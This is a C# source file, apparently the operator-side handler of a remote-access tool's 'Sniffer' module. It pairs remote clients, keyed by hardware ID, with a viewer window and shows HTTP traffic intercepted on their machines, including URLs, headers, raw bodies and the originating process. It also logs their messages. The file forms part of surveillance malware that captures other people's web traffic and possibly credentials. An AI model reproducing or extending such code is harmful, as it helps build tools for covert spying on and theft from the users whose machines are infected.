using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerSniffer
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		try
		{
			switch ((string)objects[1])
			{
			case "Connect":
			{
				string hwid = (string)objects[2];
				FormSniffer form2 = null;
				foreach (Form f in Application.OpenForms)
				{
					if (f.Name == "Sniffer:" + hwid)
					{
						form2 = (FormSniffer)f;
						break;
					}
				}
				if (form2 == null)
				{
					foreach (Form f2 in Application.OpenForms)
					{
						if (f2 is FormSniffer && string.IsNullOrEmpty(((FormSniffer)f2).client?.Hwid))
						{
							form2 = (FormSniffer)f2;
							break;
						}
					}
				}
				if (form2 != null)
				{
					form2.Invoke((MethodInvoker)delegate
					{
						form2.client = client;
						form2.Text = "Sniffer [" + hwid + "]";
						form2.Name = "Sniffer:" + hwid;
					});
					client.Tag = form2;
					client.Hwid = hwid;
				}
				else
				{
					client.Disconnect();
				}
				break;
			}
			case "Data":
				if (client.Tag != null)
				{
					FormSniffer form = (FormSniffer)client.Tag;
					string method = ((objects.Length > 2) ? ((string)objects[2]) : "");
					string url = ((objects.Length > 3) ? ((string)objects[3]) : "");
					string status = ((objects.Length > 4) ? ((string)objects[4]) : "");
					string type = ((objects.Length > 5) ? ((string)objects[5]) : "");
					string size = ((objects.Length > 6) ? ((string)objects[6]) : "");
					string headers = ((objects.Length > 7) ? ((string)objects[7]) : "");
					string raw = ((objects.Length > 8) ? ((string)objects[8]) : "");
					string index = ((objects.Length > 9) ? ((string)objects[9]) : "");
					string time = ((objects.Length > 10) ? ((string)objects[10]) : "");
					string process = ((objects.Length > 11) ? ((string)objects[11]) : "");
					form.Invoke((MethodInvoker)delegate
					{
						form.AddPacket(method, url, status, type, size, headers, raw, index, time, process);
					});
				}
				break;
			case "Log":
			{
				string log = (string)objects[2];
				Methods.AppendLogs(client.IP, log, Color.Red);
				break;
			}
			}
		}
		catch
		{
		}
	}
}
